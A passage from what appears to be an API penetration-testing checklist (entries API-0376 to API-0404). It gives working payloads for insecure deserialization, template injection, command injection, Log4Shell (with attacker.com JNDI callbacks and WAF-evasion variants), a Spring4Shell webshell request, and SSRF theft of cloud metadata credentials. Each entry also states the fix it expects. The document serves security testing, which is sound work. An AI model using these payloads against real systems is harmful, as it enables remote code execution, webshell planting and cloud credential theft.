**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Serialized object in params/cookies/body

**Test Steps:** 1. Identify Python pickle usage<br><br>2. Create malicious pickle payload<br><br>3. Send serialized object<br><br>4. Achieve code execution

**Expected Result:** Should not unpickle untrusted data

**Payload / PoC Example:**

```
Malicious pickle with __reduce__
```

**Impact:** Insecure deserialization to RCE

**Tools:** Custom Script

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0377 — Insecure Deserialization - PHP
**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Serialized object in params/cookies/body

**Test Steps:** 1. Identify PHP serialization<br><br>2. Create malicious serialized object<br><br>3. Exploit magic methods (__wakeup __destruct)<br><br>4. Achieve code execution or file access

**Expected Result:** Should not unserialize untrusted data

**Payload / PoC Example:**

```
O:8:""Malicious"":1:{s:3:""cmd"";s:6:""whoami"";}
```

**Impact:** Insecure deserialization to RCE

**Tools:** Custom Script

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0378 — Insecure Deserialization - .NET
**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Serialized object in params/cookies/body

**Test Steps:** 1. Identify .NET serialization<br><br>2. Generate payload with ysoserial.net<br><br>3. Send malicious serialized object<br><br>4. Achieve RCE

**Expected Result:** Should use secure serializers

**Payload / PoC Example:**

```
ysoserial.net TypeConfuseDelegate payload
```

**Impact:** Insecure deserialization to RCE

**Tools:** ysoserial.net

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0379 — JSON Deserialization Gadgets
**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Serialized object in params/cookies/body

**Test Steps:** 1. Identify JSON deserializer (Jackson Fastjson)<br><br>2. Inject type markers for gadget classes<br><br>3. Trigger dangerous constructors<br><br>4. Achieve RCE

**Expected Result:** Should disable polymorphic deserialization

**Payload / PoC Example:**

```
{""@type"":""com.sun.rowset.JdbcRowSetImpl""...}
```

**Impact:** Insecure deserialization to RCE

**Tools:** Custom Script

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0380 — Insecure deserialization via API body (Java / .NET / pickle)
**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API endpoint accepting serialized objects (by Content-Type / encoded body)

**Test Steps:** 1. Detect serialized formats (Java magic ac ed 00 05, .NET base64, Python pickle, PHP)<br>2. Send a BENIGN OOB-only gadget (ysoserial URLDNS / pickle __reduce__ to DNS)<br>3. Confirm the OOB callback = deserialization sink<br>4. Escalate to RCE only in-scope with permission

**Expected Result:** No native deserialization of untrusted input; safe formats + type allowlists

**Payload / PoC Example:**

```
ysoserial URLDNS 'http://$COLLAB' | base64  ->  POST body   (or pickle __reduce__ -> os.system)
```

**Impact:** Insecure deserialization -&gt; RCE / full server compromise

**Tools:** ysoserial, Burp Suite, interactsh

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; Moritz Bechler marshalsec; OWASP API8; API8:2023 Security Misconfiguration

---

## API-0381 — Server-Side Template Injection via Filename
**Phase:** 10-RCE · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Upload — Template-rendered input fields

**Test Steps:** 1. Upload file named: {{7*7}}.jpg<br>2. View file listing<br>3. Check if 49.jpg appears in response (template evaluated)

**Expected Result:** Filenames treated as literals; template engine not invoked on filenames

**Payload / PoC Example:**

```
Upload file: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}.jpg
```

**Impact:** Template injection escalating to RCE

**Tools:** tplmap, Burp Suite

**References:** -&gt;[SSTI checklist](#/checklist/ssti); James Kettle SSTI (PortSwigger Research); PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0382 — ImageMagick Shell Injection (ImageTragick)
**Phase:** 10-RCE · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Upload — Params passed to OS/command execution

**Test Steps:** 1. Upload MVG/SVG crafted for ImageTragick CVE-2016-3714<br>2. Include shell command in fill URL directive<br>3. Check for command execution

**Expected Result:** ImageMagick updated and policy.xml restricts dangerous coders

**Payload / PoC Example:**

```
push graphic-context
viewbox 0 0 640 480
fill "url(https://|id; )"
pop graphic-context
```

**Impact:** OS command execution; full server compromise

**Tools:** Burp Suite, custom payload

**References:** -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger Academy; PayloadsAllTheThings; GTFOBins; API8:2023 Security Misconfiguration

---

## API-0383 — SSTI to RCE via API Error Templates
**Phase:** 10-RCE · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template-rendered input fields

**Test Steps:** 1. Find API error message rendering user input<br>2. Test template syntax: {{7*7}}, ${7*7}, #{7*7}<br>3. Escalate to RCE payload for each engine

**Expected Result:** Template engine does not process user-controlled strings

**Payload / PoC Example:**

```
Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
```

**Impact:** Template injection escalating to RCE

**Tools:** tplmap, Burp Suite

**References:** -&gt;[SSTI checklist](#/checklist/ssti); James Kettle SSTI (PortSwigger Research); PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0384 — Command Injection in API Parameter
**Phase:** 10-RCE · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Params passed to OS/command execution

**Test Steps:** 1. Find parameter that may be used in OS command<br><br>2. Inject command separators<br><br>3. Add malicious command<br><br>4. Check for command execution

**Expected Result:** Should never pass user input to shell

**Payload / PoC Example:**

```
filename=test;whoami
```

**Impact:** OS command execution; full server compromise

**Tools:** Burp Suite

**References:** -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger Academy; PayloadsAllTheThings; GTFOBins; API8:2023 Security Misconfiguration

---

## API-0385 — Command Injection in File Processing
**Phase:** 10-RCE · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Params passed to OS/command execution

**Test Steps:** 1. Upload file with malicious filename<br><br>2. Trigger file processing<br><br>3. Check if filename used in command<br><br>4. Achieve command execution

**Expected Result:** Should sanitize filenames and avoid shell commands

**Payload / PoC Example:**

```
filename=""test;id;.pdf""
```

**Impact:** OS command execution; full server compromise

**Tools:** Burp Suite

**References:** -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger Academy; PayloadsAllTheThings; GTFOBins; API8:2023 Security Misconfiguration

---

## API-0386 — Template Injection - Detection
**Phase:** 10-RCE · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Template-rendered input fields

**Test Steps:** 1. Find parameter reflected in response<br><br>2. Inject template syntax ({{7*7}})<br><br>3. Check if expression evaluated<br><br>4. Confirm template engine

**Expected Result:** Should not pass user input to templates

**Payload / PoC Example:**

```
{{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>
```

**Impact:** Template injection escalating to RCE

**Tools:** Burp Suite

**References:** -&gt;[SSTI checklist](#/checklist/ssti); James Kettle SSTI (PortSwigger Research); PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0387 — Template Injection - Exploitation
**Phase:** 10-RCE · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template-rendered input fields

**Test Steps:** 1. Confirm template injection<br><br>2. Identify template engine<br><br>3. Craft RCE payload for specific engine<br><br>4. Achieve code execution

**Expected Result:** Should not pass user input to templates

**Payload / PoC Example:**

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Impact:** Template injection escalating to RCE

**Tools:** tplmap

**References:** -&gt;[SSTI checklist](#/checklist/ssti); James Kettle SSTI (PortSwigger Research); PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0388 — Server-Side Template Injection to RCE
**Phase:** 10-RCE · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Template-rendered input fields

**Test Steps:** 1. Find user-controlled strings reflected in responses<br>2. Test template probe payloads for each engine<br>3. Identify template engine from response<br>4. Escalate to OS command execution

**Expected Result:** Template engine does not evaluate user-controlled input; sandboxed rendering only

**Payload / PoC Example:**

```
# Detection probes (all engines)
{{7*7}}          → 49  (Jinja2, Twig)
${7*7}           → 49  (FreeMarker, Velocity)
#{7*7}           → 49  (Ruby ERB)
<%= 7*7 %>       → 49  (ERB, EJS)
{{7*'7'}}        → 7777777  (Jinja2 specific)
${{7*7}}         → 49  (Pebble)

# Jinja2 RCE (Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c(['id'],stdout=-1).communicate()[0]}}{%endif%}{%endfor%}

# Freemarker RCE (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().forName("java.lang.Runtime").getMethod("exec",String.class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Velocity RCE (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))

# Pebble (Java)
{%for i in 1..1%}{%set y=1+1%}{%endfor%}
{{7*7}}  → 49

# Tool: tplmap -u "https://target.com/api?name=*" --os-shell
```

**Impact:** Template injection escalating to RCE

**Tools:** tplmap, Burp Suite

**References:** -&gt;[SSTI checklist](#/checklist/ssti); James Kettle SSTI (PortSwigger Research); PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0389 — Log4Shell via headers (CVE-2021-44228)
**Phase:** 10-RCE · **Category:** JNDI/Log4Shell · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST User-controlled headers &amp; fields logged by Log4j

**Test Steps:** 1. Inject ${jndi:ldap://UNIQ.oast/x} into User-Agent X-Forwarded-For Authorization Cookie etc.<br>2. Watch interactsh for DNS callback<br>3. Escalate via exploit class

**Expected Result:** Patch log4j 2.17+; disable JNDI

**Payload / PoC Example:**

```
${jndi:ldap://UNIQ.oast.fun/x}
```

**Impact:** RCE

**Tools:** interactsh,nuclei,JNDI-Exploit-Kit

**References:** -&gt;[JNDI / Log4Shell checklist](#/checklist/jndi); LunaSec Log4Shell; Alvaro Munoz JNDI research; NVD CVE-2021-44228; API8:2023 Security Misconfiguration

---

## API-0390 — Log4Shell via API Headers (Log4j RCE)
**Phase:** 10-RCE · **Category:** JNDI/Log4Shell · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User-controlled headers &amp; fields logged by Log4j

**Test Steps:** 1. Inject JNDI payload in User-Agent, X-Forwarded-For, Referer headers<br>2. Check if Java app logs these headers via Log4j<br>3. Monitor Burp Collaborator for DNS callback

**Expected Result:** Log4j updated to 2.17+; JNDI lookups disabled

**Payload / PoC Example:**

```
User-Agent: ${jndi:ldap://$COLLAB/a}
X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
```

**Impact:** JNDI lookup injection (Log4Shell) yielding RCE

**Tools:** Burp Collaborator, interactsh

**References:** -&gt;[JNDI / Log4Shell checklist](#/checklist/jndi); LunaSec Log4Shell; Alvaro Munoz JNDI research; NVD CVE-2021-44228; API8:2023 Security Misconfiguration

---

## API-0391 — Log4Shell (Log4j)
**Phase:** 10-RCE · **Category:** JNDI/Log4Shell · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User-controlled headers &amp; fields logged by Log4j

**Test Steps:** 1. Find logged parameter<br><br>2. Inject JNDI lookup string<br><br>3. Point to attacker LDAP server<br><br>4. Achieve RCE

**Expected Result:** Should update Log4j and disable lookups

**Payload / PoC Example:**

```
${jndi:ldap://attacker.com/exp}
```

**Impact:** JNDI lookup injection (Log4Shell) yielding RCE

**Tools:** Burp Suite

**References:** -&gt;[JNDI / Log4Shell checklist](#/checklist/jndi); LunaSec Log4Shell; Alvaro Munoz JNDI research; NVD CVE-2021-44228; API8:2023 Security Misconfiguration

---

## API-0392 — Log4Shell via API Headers
**Phase:** 10-RCE · **Category:** JNDI/Log4Shell · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST User-controlled headers &amp; fields logged by Log4j

**Test Steps:** 1. Inject JNDI payloads in all HTTP headers<br>2. Use Burp Collaborator or interactsh for OOB detection<br>3. Try bypass variants for WAF evasion<br>4. If callback received → exploit JNDI/LDAP for RCE

**Expected Result:** Log4j 2.17+ deployed; JNDI lookups disabled; no user-controlled input in log statements

**Payload / PoC Example:**

```
# Basic JNDI injection
User-Agent: ${jndi:ldap://$COLLAB/a}
X-Forwarded-For: ${jndi:ldap://ATTACKER.interactsh.com/exploit}
X-Api-Version: ${jndi:ldaps://attacker.com:1389/Exploit}
Referer: ${jndi:rmi://attacker.com/exploit}

# WAF bypass variants
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${j${::-n}di:ldap://attacker.com/a}
${${lower:j}ndi:ldap://attacker.com/a}
${${upper:j}ndi:ldap://attacker.com/a}
${${::-j}${lower:n}di:ldap://attacker.com/a}
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://attacker.com/a}

# All headers to test (automated)
headers = ['User-Agent','X-Forwarded-For','X-Api-Version','Authorization',
           'Referer','Origin','X-Real-Ip','CF-Connecting-IP','True-Client-Ip',
           'X-Client-Ip','Forwarded','Via','X-Request-Id','X-Correlation-Id']

# interactsh setup
interactsh-client  # generates unique *.interact.sh domain
# Check for DNS/HTTP callbacks
```

**Impact:** JNDI lookup injection (Log4Shell) yielding RCE

**Tools:** Burp Collaborator, interactsh, JNDI-Exploit-Kit

**References:** -&gt;[JNDI / Log4Shell checklist](#/checklist/jndi); LunaSec Log4Shell; Alvaro Munoz JNDI research; NVD CVE-2021-44228; API8:2023 Security Misconfiguration

---

## API-0393 — Log4Shell via API Request Headers
**Phase:** 10-RCE · **Category:** JNDI/Log4Shell · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST User-controlled headers &amp; fields logged by Log4j

**Test Steps:** 1. Inject JNDI payloads in every HTTP request header<br>2. Monitor Burp Collaborator for DNS/HTTP callbacks<br>3. If callback received, exploit with JNDI/LDAP RCE payload<br>4. Try bypass variants against WAF

**Expected Result:** Log4j 2.17+ deployed; JNDI lookups disabled via log4j2.formatMsgNoLookups=true

**Payload / PoC Example:**

```
# JNDI Payloads per header
User-Agent: ${jndi:ldap://UNIQ.attacker.com/a}
X-Forwarded-For: ${jndi:ldaps://attacker.com:1389/ExploitClass}
Authorization: Bearer ${jndi:rmi://attacker.com/exploit}
X-Real-IP: ${jndi:dns://attacker.com/a}
Cookie: session=${jndi:ldap://attacker.com/x}

# WAF Evasion
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${j${::-n}di:ldap://attacker.com/a}
${${lower:j}${upper:n}di:ldap://attacker.com/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com:389/a}

# JNDI Exploit Kit server setup
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i attacker_ip -p 8888 -n attacker_domain
# Then use: ${jndi:ldap://attacker_ip:1389/TomcatMemshell}
```

**Impact:** JNDI lookup injection (Log4Shell) yielding RCE

**Tools:** JNDI-Exploit-Kit, Burp Collaborator, interactsh

**References:** -&gt;[JNDI / Log4Shell checklist](#/checklist/jndi); LunaSec Log4Shell; Alvaro Munoz JNDI research; NVD CVE-2021-44228; API8:2023 Security Misconfiguration

---

## API-0394 — Spring4Shell RCE (CVE-2022-22965)
**Phase:** 10-RCE · **Category:** RCE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Params reaching code/command execution

**Test Steps:** 1. Confirm Spring MVC/WebFlux on Java 9+<br>2. Send class.module.classLoader payload<br>3. Write webshell to accessible path via log manipulation<br>4. Trigger webshell execution

**Expected Result:** Spring Framework 5.3.18+/5.2.20+ deployed; Java SecurityManager restrictions applied

**Payload / PoC Example:**

```
# Step 1 – Write webshell via Spring classLoader (Tomcat)
POST /api/user?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1

# Step 2 – Trigger webshell
GET /tomcatwar.jsp?pwd=j&cmd=id HTTP/1.1

# Verify vulnerability (non-destructive)
POST /api/user?class.module.classLoader.URLs[0]=0 HTTP/1.1
# Returns 400 if vulnerable (class manipulation accepted)
```

**Impact:** Remote code execution; full server compromise

**Tools:** Burp Suite, Spring4Shell-POC

**References:** -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger Academy; PayloadsAllTheThings; GTFOBins; API8:2023 Security Misconfiguration

---

## API-0395 — Spring4Shell (CVE-2022-22965)
**Phase:** 10-RCE · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Confirm Spring MVC on Java 9+<br>2. Send class.module.classLoader.* payload<br>3. Write webshell to webapps/ROOT

**Expected Result:** Patch Spring 5.3.18+

**Payload / PoC Example:**

```
class.module.classLoader.resources.context.parent.pipeline.first...
```

**Impact:** RCE

**Tools:** Burp,Spring4Shell-POC

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0396 — SSRF to AWS IMDSv1 metadata
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find URL field (webhook avatar PDF gen import)<br>2. Submit http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;<br>3. Capture IAM creds

**Expected Result:** Validate URL allow-list; block link-local

**Payload / PoC Example:**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** Cloud account takeover

**Tools:** Burp Collaborator,SSRFmap

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0397 — SSRF to GCP / Azure metadata
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. GCP: http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google<br>2. Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata: true

**Expected Result:** Block metadata endpoints

**Payload / PoC Example:**

```
http://metadata.google.internal/computeMetadata/v1/
```

**Impact:** Cloud takeover

**Tools:** Burp Collaborator

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0398 — SSRF URL parser confusion
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Try http://attacker.com#@127.0.0.1/ or http://127.0.0.1@attacker.com/ or http://attacker.com\\@127.0.0.1<br>2. Try DNS rebinding via 1u.ms / nip.io

**Expected Result:** Use trusted URL parser; resolve once and validate IP

**Payload / PoC Example:**

```
http://attacker.com#@127.0.0.1/
```

**Impact:** Bypass to internal

**Tools:** Burp Collaborator,interactsh

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0399 — Blind SSRF via PDF / report generator
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find PDF generation endpoint<br>2. Inject &lt;img src=http://UNIQ.oast.fun&gt; and &lt;link rel=stylesheet href=http://internal&gt;<br>3. Listen for callback

**Expected Result:** Sandbox renderer; block external resources

**Payload / PoC Example:**

```
{"html":"<img src='http://UNIQ.oast/'>"}
```

**Impact:** Internal SSRF + cred steal

**Tools:** Burp Collaborator,interactsh

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0400 — Server-Side Request Forgery (SSRF)
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Submit URL parameter<br>2. Point to internal resources<br>3. Try cloud metadata endpoints

**Expected Result:** Should validate and whitelist URLs

**Payload / PoC Example:**

```
url: http://169.254.169.254/latest/meta-data/
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0401 — Profile Picture SSRF
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Profile Update — URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Update profile with remote image URL from internal host<br>2. Check if server fetches attacker-controlled URL<br>3. Use Burp Collaborator for out-of-band detection

**Expected Result:** Profile picture fetching uses allowlist of domains

**Payload / PoC Example:**

```
PUT /api/profile {"picture_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Collaborator

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0402 — SSRF via Admin Import/Export Endpoints
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Functions — URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Use admin data import feature<br>2. Provide URL pointing to internal service<br>3. Check if server fetches internal resource

**Expected Result:** Admin import functions validate URLs against allowlist

**Payload / PoC Example:**

```
POST /admin/import {"source_url":"http://internal-service:8080/admin"}
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** SSRFmap, Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0403 — Blind SSRF via PDF Generator API
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find PDF/report generation endpoint that embeds URLs<br>2. Include &lt;img src='http://169.254.169.254'&gt; in content<br>3. Check if server fetches internal URL during PDF generation

**Expected Result:** PDF generator uses safe rendering; blocks requests to private IPs

**Payload / PoC Example:**

```
POST /api/reports/generate {"content":"<img src=\"http://169.254.169.254/latest/meta-data/\">"}
POST /api/invoice {"template":"<iframe src='http://internal-service:8080'/>"}
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Collaborator, SSRFmap

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0404 — SSRF - Cloud Metadata Access
